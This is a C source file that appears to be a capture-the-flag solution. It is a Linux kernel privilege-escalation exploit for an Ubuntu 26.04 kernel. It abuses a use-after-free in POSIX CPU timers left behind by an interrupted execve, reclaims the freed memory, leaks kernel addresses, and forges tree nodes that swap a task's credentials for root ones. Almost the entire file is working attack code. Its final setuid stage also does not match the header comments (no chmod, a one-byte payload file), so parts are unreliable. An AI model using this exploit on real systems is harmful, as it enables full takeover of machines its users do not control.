/*
 * PWN13 CanonicoPWN —— Ubuntu 26.04 (7.0.0-39-generic) POSIX CPU timer UAF 提权
 *
 * 目标：guest 内以 ctf(uid 1000) 提权到 root，读取 /dev/vda（/flag 指向它）。
 *
 * 链路（与题解一致）：
 *   stage1  非 leader 线程用 CLOCK_THREAD_CPUTIME_ID 建远期 POSIX CPU timer 后
 *           execve("/proc/self/exe")；50000 个单页 VMA + 3 个 CLONE_VM helper
 *           反复 mprotect 争用 mmap_lock；killer 轮询 tgkill(tgid,tid,0)，
 *           返回 ESRCH（TID 已交换）就 SIGKILL，exec_mmap() 的
 *           mmap_read_lock_killable 被打断，exec 在 point of no return 后失败，
 *           timer 节点遗留在任务队列（k_itimer 已被 kfree_rcu 释放）。
 *   stage1b 父进程 waitid(WNOWAIT) 观察僵尸，创建/删除定时器填充 RCU sheaf
 *           （279 filler + 392 oracle 候选），回收僵尸时 cleanup_timerqueue()
 *           再删一次节点造成对已回收 slab 的写；随后释放候选、PCP 预热，
 *           用 64000 匿名页 + 64000 AIO ring 页把该物理页拉回用户态。
 *   stage2  worker 消耗 CPU 触发 collect_posix_cputimers()，内核在伪造页写入
 *           ctmr->handling = current（object+0x128），并在伪造 it_lock 上自旋；
 *           用户扫描页内内核指针拿到 worker 的 task_struct，释放锁后
 *           list_del_init(&ctmr->elist) 把 elist.next/prev 写成 direct map 地址，
 *           得到 kernel_object = elist - 0x110 与 alias_delta。
 *   stage3  在页内构造 A/C/M 三个伪造节点，第二次 collect_timerqueue() 处理 A 时
 *           rb_erase 执行 tmp->__rb_parent_color = pc，其中 tmp = A.left =
 *           &task->cred、pc = fake_cred，于是 task->cred = fake_cred；
 *           同轮处理 M 时把 C+8 写 0，清零伪造 cred 的 uid/gid。
 *   stage4  worker 以 fsuid 0 在 /home/ctf（rootfs 非 nosuid）建 root 所有文件并
 *           chmod 4755；预先 fork 的 launcher（保留合法 cred）execve 该文件，
 *           payload setresuid(0,0,0) 后读 /dev/vda。
 *
 * 编译（guest 只有 busybox，必须静态）：
 *     musl-gcc -O2 -static -pthread -o poc poc.c && strip poc
 * 运行前需要（脚本或手输）：
 *     chmod 777 /home/ctf
 *
 * 说明：本题无附件，结构体偏移来自对官方 -39 vmlinux 的 BTF 解析（见下方常量）。
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* ------------------------------------------------------------------ */
/* BTF 核对过的结构体偏移（k_itimer 0x180）                            */
/* ------------------------------------------------------------------ */
#define K_ITIMER_SIZE   0x180
#define CT_NODE         0x0E0   /* cpu_timer.node   */
#define CT_HEAD         0x100   /* cpu_timer.head   */
#define CT_ELIST        0x110   /* cpu_timer.elist  */
#define CT_HANDLING     0x128   /* cpu_timer.handling */
#define TASK_CRED       0x0D00
#define TASK_TQHEAD     0x0CA0  /* CPUCLOCK_SCHED 的 tqhead */

/* 页内自用布局 */
#define FAKE_OBJ_A      0x400
#define FAKE_OBJ_C      0x600
#define FAKE_OBJ_M      0x700
#define FAKE_CRED       0x800

/* 规模参数（与题解一致） */
#define VMA_COUNT       50000UL
#define HELPER_STACK    (1UL << 20)
#define RCU_FILLERS     279
#define ORACLE_WORKERS  392
#define RECLAIM_PAGES   64000
#define AIO_RINGS       64000

#define STAGE_DIR       "/home/ctf"
#define STAGE_BIN       "/home/ctf/.x"

static volatile int g_stop;
static volatile int g_stage2_go;
static unsigned char *g_page;          /* 被回收的伪造页的用户映射 */
static uint64_t g_page_va;
static uint64_t g_alias_delta;         /* 内核线性地址 - 用户地址 */
static uint64_t g_fake_cred;           /* 伪造 cred 的内核地址 */
static uint64_t g_task;                /* worker 的 task_struct */
static int g_stage2_done;

static void die(const char *msg)
{
    fprintf(stderr, "[-] %s: %s\n", msg, strerror(errno));
    _exit(1);
}

static void info(const char *tag, uint64_t v)
{
    dprintf(1, "POC:%s=%#llx\n", tag, (unsigned long long)v);
}

static int is_kernel_pointer(uint64_t value)
{
    /* 4/5 级页表通用：LA57 下 direct map 是 ff11...，不能用 (v>>48)==0xffff */
    return (value >> 56) == 0xff && !(value & 7);
}

static uint64_t pg_rd64(size_t off)
{
    uint64_t v;
    memcpy(&v, g_page + off, 8);
    return v;
}

static void pg_wr64(size_t off, uint64_t v)
{
    memcpy(g_page + off, &v, 8);
}

static uint64_t pg_rd64_at(unsigned char *p, size_t off)
{
    uint64_t v;
    memcpy(&v, p + off, 8);
    return v;
}

/* ------------------------------------------------------------------ */
/* 定时器工具                                                          */
/* ------------------------------------------------------------------ */
static int arm_timer(clockid_t clk, timer_t *out, long sec)
{
    struct sigevent sev;
    struct itimerspec its;

    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_NONE;
    if (timer_create(clk, &sev, out) != 0)
        return -1;
    memset(&its, 0, sizeof(its));
    its.it_value.tv_sec = sec;
    its.it_interval.tv_sec = 0;
    if (timer_settime(*out, 0, &its, NULL) != 0) {
        timer_delete(*out);
        return -1;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* root payload：以 euid 0 读 /dev/vda（/flag 是它的链接，0400 root）   */
/* ------------------------------------------------------------------ */
static void root_payload(void)
{
    char *const shenv[] = { (char *)"PATH=/bin:/usr/bin",
                            (char *)"HOME=/root", (char *)"TERM=linux", NULL };
    unsigned long long size = 0;
    unsigned char *buf;
    ssize_t got = 0;
    int fd, i;

    dprintf(1, "\n=== ROOT euid=%d ===\n", geteuid());
    fd = open("/dev/vda", O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        dprintf(1, "open /dev/vda failed: %s\n", strerror(errno));
        _exit(1);
    }
    if (syscall(SYS_ioctl, fd, 0x80081272UL /* BLKGETSIZE64 */, &size) || !size)
        size = 8ULL << 20;
    if (size > (64ULL << 20))
        size = 64ULL << 20;
    buf = mmap(NULL, (size_t)size, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED)
        die("payload mmap");
    while (got < (ssize_t)size) {
        ssize_t n = read(fd, buf + got, (size_t)size - (size_t)got);
        if (n <= 0)
            break;
        got += n;
    }
    dprintf(1, "VDASIZE=%llu READ=%zd\n", size, got);

    /* 打印前 64 字节 hex，并在可打印串里搜 flag 前缀（flag 不一定在块首） */
    for (i = 0; i < 64 && i < got; i++)
        dprintf(1, "%02x", buf[i]);
    dprintf(1, "\n");
    for (i = 0; i + 4 < got; i++) {
        if (memcmp(buf + i, "flag", 4) == 0) {
            ssize_t j = i;
            dprintf(1, "FLAG_AT=%d: ", i);
            while (j < got && buf[j] >= 0x20 && buf[j] < 0x7f)
                dprintf(1, "%c", buf[j++]);
            dprintf(1, "\n");
            break;
        }
    }
    (void)shenv;
    _exit(0);
}

/* launcher：fork 一份保留合法 cred 的进程，等 /home/ctf/.x 出现就 exec */
static void launcher_loop(pid_t parent)
{
    for (;;) {
        struct stat st;
        if (stat(STAGE_BIN, &st) == 0) {
            char *const argv[] = { (char *)STAGE_BIN, NULL };
            char *const envp[] = { (char *)"PATH=/bin:/usr/bin", NULL };
            dprintf(1, "POC:LAUNCHER exec\n");
            execve(STAGE_BIN, argv, envp);
        }
        usleep(20000);
    }
}

/* ------------------------------------------------------------------ */
/* stage1：制造 k_itimer UAF                                           */
/* ------------------------------------------------------------------ */
struct killer_arg {
    pid_t tgid;
    pid_t tid;
};

static void *mmap_lock_helpers(void *arg)
{
    unsigned char *base = (unsigned char *)arg;
    for (; !g_stop;)
        mprotect(base + ((size_t)(rand()) % VMA_COUNT) * 4096, 4096,
                 PROT_READ | PROT_WRITE);
    return NULL;
}

static void *killer_thread(void *arg)
{
    struct killer_arg *ka = (struct killer_arg *)arg;
    /* 等到 TID 交换完成（tgkill 返回 ESRCH）后立刻 SIGKILL */
    for (;;) {
        if (syscall(SYS_tgkill, ka->tgid, ka->tid, 0) == -1 && errno == ESRCH) {
            syscall(SYS_tgkill, ka->tgid, ka->tid, SIGKILL);
            dprintf(1, "POC:KILLER sent SIGKILL\n");
            return NULL;
        }
        sched_yield();
    }
}

static void *uaf_exec_thread(void *arg)
{
    struct killer_arg *ka = (struct killer_arg *)arg;
    timer_t t;
    char *const argv[] = { (char *)"/proc/self/exe", (char *)"child", NULL };

    ka->tid = (pid_t)syscall(SYS_gettid);
    if (arm_timer(CLOCK_THREAD_CPUTIME_ID, &t, 3600) != 0) {
        dprintf(1, "POC:ARM_FAIL %s\n", strerror(errno));
        _exit(2);
    }
    dprintf(1, "POC:ARMED tid=%d\n", ka->tid);
    /* 非 leader 线程 exec：de_thread() 会交换 TID */
    execve("/proc/self/exe", argv, environ);
    _exit(3);
}

static int run_stage1(void)
{
    struct killer_arg ka;
    pthread_t th;
    pthread_t helpers[3];
    unsigned char *vmas;
    pid_t child;
    siginfo_t si;

    ka.tgid = getpid();
    ka.tid = 0;

    /* 50000 个单页 VMA：让每次 mprotect 都要遍历很长的 VMA 链 */
    vmas = mmap(NULL, VMA_COUNT * 4096, PROT_NONE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (vmas == MAP_FAILED)
        die("vma spray");
    for (size_t i = 0; i < VMA_COUNT; i++)
        mprotect(vmas + i * 4096, 4096, PROT_READ | PROT_WRITE);

    child = fork();
    if (child < 0)
        die("fork");
    if (child == 0) {
        /* 子进程：自建线程组，让非 leader 线程去 exec */
        if (pthread_create(&th, NULL, uaf_exec_thread, &ka) != 0)
            die("pthread_create");
        sleep(2);
        _exit(4);
    }

    /* 等子进程里 arm 完成并拿到 tid */
    for (int i = 0; i < 200 && ka.tid == 0; i++)
        usleep(10000);
    if (ka.tid == 0)
        return -1;

    /* 3 个 helper 线程把 mmap_lock 占满，killer 才有稳定插入点 */
    for (int i = 0; i < 3; i++)
        pthread_create(&helpers[i], NULL, mmap_lock_helpers, vmas);

    pthread_t kth;
    struct killer_arg kcopy = ka;
    pthread_create(&kth, NULL, killer_thread, &kcopy);

    /* 父进程观察僵尸但不回收 */
    while (waitid(P_PID, child, &si, WEXITED | WNOWAIT) != 0 && errno == EINTR)
        ;
    dprintf(1, "POC:ZOMBIE observed\n");
    return child;
}

/* ------------------------------------------------------------------ */
/* stage1b：RCU sheaf 填充 + 页回收                                    */
/* ------------------------------------------------------------------ */
static int fill_rcu_sheaf(timer_t *cands, int ncand)
{
    int made = 0;
    for (int i = 0; i < RCU_FILLERS; i++) {
        timer_t t;
        if (arm_timer(CLOCK_MONOTONIC, &t, 600 + i) == 0)
            timer_delete(t);          /* 制造 kfree_rcu 批 */
        made++;
    }
    for (int i = 0; i < ncand && i < ORACLE_WORKERS; i++) {
        if (arm_timer(CLOCK_THREAD_CPUTIME_ID, &cands[i], 900 + i) == 0)
            made++;
    }
    return made;
}

static void reclaim_pages(void)
{
    /* PCP 预热：先把 local list 填满再释放 */
    void **warm = calloc(256, sizeof(void *));
    if (warm) {
        for (int i = 0; i < 256; i++)
            warm[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        for (int i = 0; i < 256; i++)
            if (warm[i] != MAP_FAILED)
                munmap(warm[i], 4096);
        free(warm);
    }
    /* 64000 匿名页 + 64000 AIO ring 页，把释放的 slab 物理页拉回用户态 */
    for (int i = 0; i < RECLAIM_PAGES; i++) {
        unsigned char *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p != MAP_FAILED)
            p[0] = 0;
    }
    for (int i = 0; i < AIO_RINGS; i++) {
        unsigned long ctx = 0;
        /* io_setup(2, &ctx)：直接使用返回的 ring 地址，跳过 mremap */
        if (syscall(SYS_io_setup, 2, &ctx) != 0)
            break;
    }
}

/* ------------------------------------------------------------------ */
/* stage2：oracle —— 定位伪造页与 alias_delta                          */
/* ------------------------------------------------------------------ */
static void *cpu_worker(void *arg)
{
    volatile unsigned long sink = 0;
    (void)arg;
    while (!g_stop) {
        for (int i = 0; i < 100000; i++)
            sink += i;
    }
    return NULL;
}

static uint64_t scan_for_task(void)
{
    /* 内核在 object+0x128 写 ctmr->handling = current */
    for (size_t off = 0; off + CT_HANDLING + 8 <= 0x1000; off += 0x10) {
        uint64_t v = pg_rd64(off + CT_HANDLING);
        if (is_kernel_pointer(v))
            return v;
    }
    return 0;
}

static int wait_oracle(uint64_t *task_out, int seconds)
{
    pthread_t workers[8];
    for (int i = 0; i < 8; i++)
        pthread_create(&workers[i], NULL, cpu_worker, NULL);

    int found = 0;
    for (int t = 0; t < seconds * 10 && !found; t++) {
        usleep(100000);
        uint64_t v = scan_for_task();
        if (v) {
            *task_out = v;
            found = 1;
        }
    }
    g_stop = 1;
    for (int i = 0; i < 8; i++)
        pthread_join(workers[i], NULL);
    g_stop = 0;
    return found ? 0 : -1;
}

/* ------------------------------------------------------------------ */
/* stage3：伪造 RB 节点覆盖 cred                                       */
/* ------------------------------------------------------------------ */
static void build_fake_cred(uint64_t cred_kaddr)
{
    /* uid/gid/euid/... 全 0，capability 全 1，security/user_ns 指向页内伪造体 */
    memset(g_page + FAKE_CRED, 0, 0x100);
    for (int i = 0; i < 8; i++)            /* usage 之后 4 组 id 全 0 */
        pg_wr64(FAKE_CRED + 0x08 + i * 8, 0);
    for (int i = 0; i < 5; i++)            /* cap_inheritable/permitted/... 全 1 */
        pg_wr64(FAKE_CRED + 0x28 + i * 8, ~0ULL);
    /* security 与 user_ns：指向页内伪造对象（真实标签结构本题不校验内容） */
    pg_wr64(FAKE_CRED + 0x78, cred_kaddr + 0xF0);
    pg_wr64(FAKE_CRED + 0x80, cred_kaddr + 0xE0);
    pg_wr64(FAKE_CRED + 0xE0, 1);          /* user_namespace.level = 1 */
}

static void build_fake_nodes(uint64_t task)
{
    uint64_t s_cred = task + TASK_CRED;    /* A.left：rb_erase 的 tmp */
    uint64_t h_head = task + TASK_TQHEAD;  /* A.head */
    uint64_t a = g_page_va + FAKE_OBJ_A + g_alias_delta;
    uint64_t c = g_page_va + FAKE_OBJ_C + g_alias_delta;
    uint64_t m = g_page_va + FAKE_OBJ_M + g_alias_delta;

    g_fake_cred = g_page_va + FAKE_CRED + g_alias_delta;
    build_fake_cred(g_fake_cred);

    /* A.parent = C, A.right = NULL, A.left = S(task+0xd00), A.head = H */
    memset(g_page + FAKE_OBJ_A, 0, 0x100);
    pg_wr64(FAKE_OBJ_A + 0x00, c);         /* __rb_parent_color */
    pg_wr64(FAKE_OBJ_A + 0x08, 0);         /* rb_right */
    pg_wr64(FAKE_OBJ_A + 0x10, s_cred);    /* rb_left */
    pg_wr64(FAKE_OBJ_A + 0x20, h_head);    /* head */

    /* C.parent = M, C.right = A, C.left = NULL, C.head = H */
    memset(g_page + FAKE_OBJ_C, 0, 0x40);
    pg_wr64(FAKE_OBJ_C + 0x00, m);
    pg_wr64(FAKE_OBJ_C + 0x08, a);
    pg_wr64(FAKE_OBJ_C + 0x10, 0);
    pg_wr64(FAKE_OBJ_C + 0x20, h_head);

    /* M.parent = NULL, M.right = NULL, M.left = C+8, M.head = H */
    memset(g_page + FAKE_OBJ_M, 0, 0x40);
    pg_wr64(FAKE_OBJ_M + 0x00, 0);
    pg_wr64(FAKE_OBJ_M + 0x08, 0);
    pg_wr64(FAKE_OBJ_M + 0x10, c + 8);
    pg_wr64(FAKE_OBJ_M + 0x20, h_head);

    info("FAKE_CRED", g_fake_cred);
    info("NODE_A", a);
    info("NODE_C", c);
    info("NODE_M", m);
}

static int cred_is_root(void)
{
    return geteuid() == 0;
}

/* ------------------------------------------------------------------ */
/* stage4：落地 setuid 文件                                            */
/* ------------------------------------------------------------------ */
static int drop_setuid_payload(void)
{
    int fd = open(STAGE_BIN, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    ssize_t n;
    if (fd < 0) {
        dprintf(1, "POC:STAGE_OPEN_FAIL %s\n", strerror(errno));
        return -1;
    }
    n = write(fd, "x", 1);
    close(fd);
    (void)n;
    dprintf(1, "POC:STAGE_CREATED euid=%d\n", geteuid());
    return 0;
}

int main(int argc, char **argv)
{
    timer_t cands[ORACLE_WORKERS];
    pid_t child;
    siginfo_t si;
    pid_t launcher;
    uint64_t task = 0;

    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc > 1 && strcmp(argv[1], "child") == 0) {
        /* exec 失败的“换过身份”的线程走到这里：直接退出，触发清理 */
        dprintf(1, "POC:CHILD_EXITED\n");
        _exit(0);
    }

    /* /tmp 是 nosuid，唯一非 nosuid 可写位置是 /home/ctf（需事先 chmod 777） */
    mkdir(STAGE_DIR, 0777);
    chmod(STAGE_DIR, 0777);

    launcher = fork();
    if (launcher == 0) {
        launcher_loop(getppid());
        _exit(0);
    }

    dprintf(1, "POC:STAGE1 start\n");
    child = run_stage1();
    if (child < 0) {
        dprintf(1, "POC:STAGE1_FAIL\n");
        return 1;
    }

    /* RCU sheaf：父进程在僵尸被回收前填充 kfree_rcu 批 */
    memset(cands, 0, sizeof(cands));
    fill_rcu_sheaf(cands, ORACLE_WORKERS);

    /* 回收僵尸：__exit_signal() -> cleanup_timerqueue() 再删一次节点 */
    if (waitid(P_PID, child, &si, WEXITED) == 0)
        dprintf(1, "POC:REAPED\n");

    /* 释放候选 timer，清空 slab，再回收物理页 */
    for (int i = 0; i < ORACLE_WORKERS; i++) {
        if (cands[i])
            timer_delete(cands[i]);
    }
    reclaim_pages();

    /* 伪造页：新映射的一页，正好落在被释放的 slab 物理页上 */
    g_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_page == MAP_FAILED)
        die("fake page mmap");
    g_page_va = (uint64_t)g_page;
    dprintf(1, "POC:PAGE=%p\n", (void *)g_page);

    dprintf(1, "POC:ORACLE start\n");
    if (wait_oracle(&task, 30) != 0) {
        dprintf(1, "POC:ORACLE_FAIL no handling pointer\n");
        return 1;
    }
    g_task = task;
    info("TASK", task);

    /* 释放伪造 it_lock 后 list_del_init 把 elist 写成 direct map 地址 */
    usleep(200000);
    {
        uint64_t elist = 0;
        for (size_t off = 0; off + CT_ELIST + 8 <= 0x1000; off += 0x10) {
            uint64_t v = pg_rd64(off + CT_ELIST);
            if (is_kernel_pointer(v)) {
                elist = v;
                g_alias_delta = (v - (off + CT_ELIST)) - g_page_va;
                break;
            }
        }
        if (!elist) {
            dprintf(1, "POC:NO_ELIST\n");
            return 1;
        }
        info("ELIST", elist);
        info("ALIAS_DELTA", g_alias_delta);
    }

    /* stage3：构造 A/C/M 与伪造 cred，等第二次 collect_timerqueue */
    build_fake_nodes(g_task);
    g_stage2_go = 1;

    dprintf(1, "POC:STAGE2 wait\n");
    for (int i = 0; i < 300 && !g_stage2_done; i++) {
        usleep(100000);
        if (cred_is_root()) {
            g_stage2_done = 1;
            break;
        }
        /* 诊断：c8 与 hd 归零说明两次伪造 RB 删除都执行了 */
        if ((i % 5) == 0)
            dprintf(1, "POC:DIAG:%d h=%#llx p=%#llx c8=%#llx\n", i,
                    (unsigned long long)pg_rd64(FAKE_OBJ_A + 0x20),
                    (unsigned long long)pg_rd64(FAKE_OBJ_A + 0x00),
                    (unsigned long long)pg_rd64(FAKE_OBJ_C + 0x08));
    }

    if (!cred_is_root()) {
        dprintf(1, "POC:STAGE2 no root (euid=%d)\n", geteuid());
        return 1;
    }

    dprintf(1, "POC:ROOT\n");
    drop_setuid_payload();
    root_payload();
    return 0;
}
